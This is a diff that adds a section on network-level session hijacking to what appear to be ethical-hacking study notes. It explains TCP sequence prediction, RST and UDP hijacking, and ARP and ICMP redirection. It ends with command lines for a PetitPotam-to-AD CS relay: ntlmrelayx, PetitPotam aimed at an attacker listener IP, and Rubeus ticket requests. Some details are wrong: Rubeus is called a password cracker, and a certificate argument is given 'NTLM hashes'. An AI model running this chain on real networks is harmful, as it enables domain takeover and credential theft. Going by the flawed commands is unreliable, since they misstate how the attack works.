@@ -3437,3 +3437,65 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 			- The attacker then donates their session ID (e.g., http://citibank.com/?SID=0D6441FEA4496C2) to the victim and lures the victim into clicking it to access the website.
 			- The victim clicks the link, believing it to be legitimate, and it opens the server’s page in the victim’s browser with the session ID (SID=0D6441FEA4496C2). The victim then enters their information on the page and submits it.
 			- The attacker can now log in as themselves and acquire the victim’s information.
+- Network-Level Session Hijacking:
+	- Network-level session hijacking relies on compromising transport and Internet protocols used by web applications at the application layer. By targeting network-level sessions, attackers can gather critical information that is used to exploit application-level sessions.
+	- Three-way Handshake:
+		- The TCP three-way handshake establishes a connection between two parties by exchanging essential parameters. First, the client, in the CLOSED state, sends its Initial Sequence Number (ISN) with the SYN flag, transitioning to the SYN-SENT state.
+		- The server, in the LISTENING state, acknowledges the client’s ISN, sends its own ISN with the SYN flag, and moves to the SYN-RECEIVED state.
+		- Finally, the client acknowledges the server’s ISN and transitions to the ESTABLISHED state, with the server doing the same upon receiving the acknowledgment, enabling communication.
+		- To terminate the connection, the RST flag forces an immediate shutdown to the CLOSED state, while the FIN flag initiates a graceful closure, transitioning to the CLOSE-WAIT state.
+		- For packets to be accepted during communication, their sequence numbers must fall within the expected range; otherwise, they are dropped, and an acknowledgment with the expected sequence number is sent. Successful communication requires IP addresses, port numbers, and sequence numbers.
+		- An attacker can easily determine the IP address and port number, as these are visible in the IP packets and remain constant throughout the session. However, sequence numbers change with each packet, making them harder to predict. For a blind hijack, the attacker must accurately guess the sequence numbers.
+		- If the attacker successfully tricks the server into accepting and executing spoofed packets, they can hijack the session. By anticipating the next sequence number and acknowledgment (ACK) number that the client will send, the attacker can spoof the client’s address and initiate communication with the server.
+	- Types of Network-Level Session Hijacking:
+		- TCP/IP Hijacking:
+			- TCP/IP hijacking involves an attacker intercepting an established connection between two communicating parties by using spoofed packets to impersonate one of them. The attacker redirects the TCP traffic to their own machine, causing the victim’s connection to hang. The attacker can then communicate with the host machine on the victim’s behalf.
+			- To carry out a TCP/IP hijacking attack, the attacker must be on the same network as the victim, while the target server and victim machine can be located anywhere. This technique is particularly effective against systems that rely on one-time passwords.
+			- TCP/IP Hijacking Steps:
+				- In TCP/IP hijacking, the attacker intercepts a victim’s connection and uses their IP address to send spoofed packets with predicted sequence numbers.
+				- The receiver processes the spoofed packet, updates the sequence number, and sends an acknowledgment (ACK) to the victim.
+				- Unaware of the spoofed packet, the victim ignores the ACK, leading to a desynchronized connection.
+				- The attacker then continuously sends spoofed packets, maintaining communication with the receiver while the victim’s connection hangs.
+				- The server mistakenly drops packets from the victim, allowing the attacker to successfully hijack the session and control the communication.
+		- IP Spoofing (Source-Routed Packets):
+			- Source routed packets allow attackers to gain unauthorized access by using a trusted host’s IP address. This type of attack enables the attacker to create acceptable packets to insert into an active TCP session. The attacker first spoofs the trusted host’s IP address, tricking the server into accepting packets as if they were from the trusted host. Using the source-routing technique, the attacker specifies the path the packets take from the source to the destination, convincing the server it is communicating with the legitimate user.
+			- After successfully spoofing the IP address, the attacker manipulates the sequence and acknowledgment (ACK) numbers. The forged packets are then injected into the TCP session before the client can respond. This leads to a desynchronized state, as the sequence and ACK numbers are no longer aligned. The original packets from the client are lost because the server processes the attacker’s packet with a new Initial Sequence Number (ISN). Subsequent packets are also source routed to a destination specified by the attacker, completing the hijack.
+		- RST Hijacking:
+			- RST hijacking involves injecting an authentic-looking (forged) reset (RST) packet into an active connection using a spoofed source IP address and a predicted acknowledgment (ACK) number. If the attacker accurately predicts the ACK number, the victim accepts the reset packet as legitimate and terminates the connection, believing it was sent by the source.
+			- This attack can be executed using packet-crafting tools such as Colasoft Packet Builder and TCP/IP analysis tools such as tcpdump.
+		- Blind Hijacking:
+			- In blind hijacking, an attacker injects malicious data or commands into an intercepted TCP session, even when source-routing is disabled. To perform this attack, the attacker must correctly guess the next Initial Sequence Number (ISN) of a computer attempting to establish a connection.
+			- While the attacker can send malicious data or commands, such as altering password settings to gain access from another location, they cannot view the response. To see the response, a Man-in-the-Middle (MITM) attack would be a more effective option.
+		- UDP Hijacking:
+			- The User Datagram Protocol (UDP) does not use packet sequencing or synchronization, making UDP sessions more vulnerable to attacks than TCP sessions. Since UDP is connectionless, it is easier to modify data without the victim noticing. In a network-level session hijack, the attacker sends a forged server reply to a client’s UDP request before the server can respond, taking control of the session.
+			- The server’s reply can be easily intercepted using sniffing techniques. A Man-in-the-Middle (MITM) attack can further facilitate UDP hijacking by preventing the server's reply from reaching the client in the first place.
+			- UDP Hijacking Working:
+				- Spoofing the Source IP Address: Since UDP does not require a handshake before data transmission, attackers can send UDP packets with a spoofed source IP address, impersonating another host.
+				- Intercepting Traffic: The attacker sends forged UDP packets to either the client or server. These packets appear to come from a legitimate source but may contain malicious data or instructions.
+				- Manipulating Communication: By injecting false information into the data stream or initiating unauthorized requests, the attacker can manipulate the behavior of an application relying on UDP traffic.
+		- Man-in-The-Middle (Packet Sniffing) Attack Using Forged ICMP and ARP Spoofing:
+			- An MITM (Man-in-the-Middle) attack involves intercepting communication between a client and server using a packet sniffer. The attacker changes the client’s default gateway to reroute packets through their own machine.
+			- This is achieved through two techniques: Forged ICMP and ARP Spoofing. In both methods, the attacker manipulates the routing of packets in transit between the client and server, redirecting them through the attacker’s machine.
+			- Forged Internet Control Message Protocol (ICMP):
+				- The Internet Control Message Protocol (ICMP) is an extension of IP used to send error messages. In this attack, the attacker forges ICMP packets to deceive the client and server. These forged ICMP packets are used to redirect traffic between the client and server through the hijacker’s machine. The attacker sends error messages, falsely indicating issues in processing packets via the original connection, which causes the client and server to route traffic through the attacker’s path instead.
+			- Address Resolution Protocol (ARP) Spoofing:
+				- Hosts use Address Resolution Protocol (ARP) to map IP addresses to MAC (hardware) addresses. ARP spoofing involves manipulating the ARP tables of hosts by broadcasting false ARP replies. The attacker sends forged ARP replies to update the ARP tables of hosts that are broadcasting ARP requests. This causes the traffic to be routed through the attacker’s machine instead of the legitimate destination IP address.
+		- PetitPotam Hijacking:
+			- In a PetitPotam attack, an attacker forces a domain controller (DC) to initiate authentication to the attacker’s server. The attacker uses Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) API to hijack the authentication session. The attacker’s SMB server manipulates the session, making the domain controller believe the attacker is a legitimate user, thus allowing the attacker to capture the domain controller’s NTLM hash. To carry out this attack, the attacker must have valid credentials of a legitimate user within the network.
+			- Once the attacker obtains the NTLM hash, they relay it to the Active Directory Certificate Services (AD CS) to generate a certificate. In some cases, AD CS may also act as the domain controller. Using the generated certificate, the attacker gains administrative privileges, taking full control of the AD server and, by extension, the entire network managed by the domain controller.
+			- PetitPotam Hijacking Steps:
+				- The attacker uses previously captured NTLM credentials to authenticate with the target server.
+				- The attacker utilizes the EfsRpcOpenFileRaw command from the MS-EFSRPC API to coerce the target server into performing NTLM authentication for another system.
+				- The attacker then initiates an NTLM relay attack to gain remote access to the target Active Directory Certificate Services (AD CS).
+				- Finally, the attacker creates an AD certificate, which grants administrative privileges to the target AD server.
+			- Commands to Perform PetitPotam Hijacking Attack:
+				- Use the following command to identify the certificate authority:
+					=> certutil.exe
+				- Use the following command from the Impacket toolkit to set up HTTP/SMB configuration and capture credentials from the domain controller (DC):
+					=> ntlmrelayx.py -t <URL of Certificate Authority with web enrollment> -smb2support --adcs --template DomainController
+				- To force authentication using the captured credentials via the MS-EFSRPC API call, run:
+					=> python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
+				- If the DC is vulnerable, you can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
+					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
+				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
+					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
